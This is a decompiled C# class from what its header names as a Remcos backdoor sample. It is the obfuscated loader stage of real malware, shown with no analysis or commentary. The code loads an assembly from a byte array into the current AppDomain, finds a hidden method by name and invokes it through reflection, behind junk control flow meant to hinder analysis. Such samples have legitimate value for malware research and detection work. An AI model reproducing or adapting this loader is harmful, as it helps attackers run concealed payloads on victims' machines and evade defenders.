// Decompiled with JetBrains decompiler
// Type: Otsvixv.DescriptorAuthenticationConnector
// Assembly: Htrfwkj, Version=10.0.14393.0, Culture=neutral, PublicKeyToken=null
// MVID: 515AD638-AF99-4E13-90D9-A5E7D6BF4EA3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Backdoor.Win32.Remcos.ucy-9a9c931a412df86ea65b5228c9237d2e5e2199715858d8b4ae1caec6d5702131.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Otsvixv
{
  internal class DescriptorAuthenticationConnector : InvocationMapAuth
  {
    private AppDomain m_Wrapper;
    private TaskValueExporter system;
    internal static DescriptorAuthenticationConnector CreatePublisher;

    internal void SearchWrapper()
    {
      this.system = new TaskValueExporter();
      this.m_Wrapper = AppDomain.CurrentDomain;
    }

    internal void AssetWrapper() => this.m_Wrapper.Load((byte[]) DescriptorAuthenticationConnector.SearchPublisher((object) this.system));

    internal void VerifyWrapper()
    {
      foreach (Assembly assembly in this.m_Wrapper.GetAssemblies())
      {
label_11:
        foreach (Type type in assembly.GetTypes())
        {
          foreach (MemberInfo member in type.GetMembers())
          {
            if (member.Name == "Etikfbcdokkkkaxjriq")
            {
              type.InvokeMember(member.Name, BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
              int num = 1;
              if (\u003CModule\u003E\u007B4729abbb\u002D01c2\u002D4a4d\u002Db2f0\u002D7fae13219cc9\u007D.m_8604852082a54c7c89286315f798e4cb.m_6d8760fd43774fcaafb1f58af65c0a30 == 0)
                goto label_3;
label_1:
              switch (num)
              {
                case 1:
                  continue;
                default:
                  goto label_11;
              }
label_3:
              num = 1;
              goto label_1;
            }
          }
        }
      }
    }

    internal static bool UpdatePublisher() => DescriptorAuthenticationConnector.CreatePublisher == null;

    internal static DescriptorAuthenticationConnector RunPublisher() => DescriptorAuthenticationConnector.CreatePublisher;

    internal static object SearchPublisher([In] object obj0) => (object) ((TaskValueExporter) obj0).ReflectWrapper();
  }
}
